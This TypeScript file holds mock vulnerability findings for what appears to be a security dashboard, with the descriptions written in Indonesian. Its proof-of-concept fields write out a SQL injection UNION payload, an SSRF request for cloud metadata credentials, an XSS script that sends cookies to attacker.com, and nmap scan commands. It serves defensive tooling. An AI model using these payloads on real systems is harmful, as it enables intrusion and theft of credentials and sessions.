export interface MockFinding {
  id: string
  title: string
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'
  cvss: number
  vector: string
  cwe: string
  scanner: string
  host: string
  port: number
  protocol: string
  endpoint: string
  status: string
  description: string
  businessImpact: string
  remediation: string
  poc: string
}

export const mockFindings: MockFinding[] = [
  {
    id: 'VF-001',
    title: 'SQL Injection in User Authentication Route',
    severity: 'CRITICAL',
    cvss: 9.8,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe: 'CWE-89',
    scanner: 'nuclei-v3',
    host: 'app.target-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/api/v1/auth/login',
    status: 'OPEN',
    description: 'Endpoint autentikasi tidak menggunakan parameterized query pada field username, memungkinkan attacker menyisipkan statement SQL arbitrer.',
    businessImpact: 'Penyerang dapat membobol database pelanggan, mengekstrak hash password, atau mengubah data transaksi secara ilegal.',
    remediation: 'Gunakan prepared statements / parameterized queries (ORM atau PDO parameterized statement). Jangan pernah menggabungkan input user ke string query SQL.',
    poc: "POST /api/v1/auth/login HTTP/1.1\nHost: app.target-corp.com\nContent-Type: application/json\n\n{\"username\": \"admin' UNION SELECT 1, password, 3 FROM users--\", \"password\": \"test\"}"
  },
  {
    id: 'VF-002',
    title: 'Server-Side Request Forgery (SSRF) to Cloud Metadata',
    severity: 'HIGH',
    cvss: 8.6,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N',
    cwe: 'CWE-918',
    scanner: 'nuclei-v3',
    host: 'api.target-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/v1/media/import-url',
    status: 'IN_REVIEW',
    description: 'Fitur import gambar menerima URL eksternal tanpa validasi IP privat, memungkinkan pemanggilan endpoint AWS EC2 metadata (169.254.169.254).',
    businessImpact: 'Eksfiltrasi kredensial IAM Role sementara mesin cloud, membuka peluang pengambilalihan akun cloud infrastruktur.',
    remediation: 'Implementasikan SafeURLFetcher yang memblokir rentang IP privat RFC 1918, link-local, dan cloud metadata dengan verifikasi IP hasil resolusi DNS tunggal.',
    poc: "POST /v1/media/import-url HTTP/1.1\nHost: api.target-corp.com\n\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
  },
  {
    id: 'VF-003',
    title: 'Stored Cross-Site Scripting (XSS) in Client Feedback',
    severity: 'MEDIUM',
    cvss: 6.1,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    cwe: 'CWE-79',
    scanner: 'nuclei-v3',
    host: 'feedback.target-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: '/feedback/submit',
    status: 'OPEN',
    description: 'Field catatan pada formulir feedback tidak disanitasi sebelum disimpan ke database dan dirender kembali pada dashboard admin.',
    businessImpact: 'Pencurian session cookie administrator atau tindakan arbitrer atas nama user admin yang melihat halaman umpan balik.',
    remediation: 'Terapkan kontekstual HTML entity encoding sebelum output dirender ke browser, dan pasang Content-Security-Policy (CSP) yang melarang inline scripts.',
    poc: "<script>fetch('http://attacker.com/log?c='+document.cookie)</" + "script>"
  },
  {
    id: 'VF-004',
    title: 'Exposed Redis Service Without Authentication',
    severity: 'CRITICAL',
    cvss: 9.8,
    vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    cwe: 'CWE-306',
    scanner: 'nmap-7.9',
    host: 'cache.target-corp.com',
    port: 6379,
    protocol: 'TCP',
    endpoint: 'redis://cache.target-corp.com:6379',
    status: 'OPEN',
    description: 'Port Redis 6379 terbuka ke publik internet tanpa password requirement (requirepass dinonaktifkan).',
    businessImpact: 'Penyerang dapat membaca cache session pengguna, memodifikasi data, atau mengeksekusi Remote Code Execution (RCE) via write to cron file.',
    remediation: 'Konfigurasikan requirepass dengan password kuat dan ikat binding Redis hanya ke antarmuka localhost (127.0.0.1) atau private VPC network.',
    poc: "nmap -p 6379 --script redis-info cache.target-corp.com"
  },
  {
    id: 'VF-005',
    title: 'Deprecated TLS 1.0/1.1 Ciphers Enabled',
    severity: 'LOW',
    cvss: 3.7,
    vector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N',
    cwe: 'CWE-326',
    scanner: 'nmap-7.9',
    host: 'gateway.target-corp.com',
    port: 443,
    protocol: 'HTTPS',
    endpoint: 'ssl/tls',
    status: 'ACCEPTED_RISK',
    description: 'Server web masih mengizinkan negosiasi handshake TLS 1.0 dan cipher CBC yang rentan serangan POODLE/BEAST.',
    businessImpact: 'Penyerang Man-in-the-Middle (MitM) berpotensi mendekripsi sebagian lalu lintas komunikasi jika kondisi jaringan tertentu terpenuhi.',
    remediation: 'Nonaktifkan TLS 1.0 dan TLS 1.1 pada konfigurasi reverse proxy Nginx/Cloudflare; wajibkan TLS 1.2 dan TLS 1.3 saja.',
    poc: "nmap --script ssl-enum-ciphers -p 443 gateway.target-corp.com"
  }
]
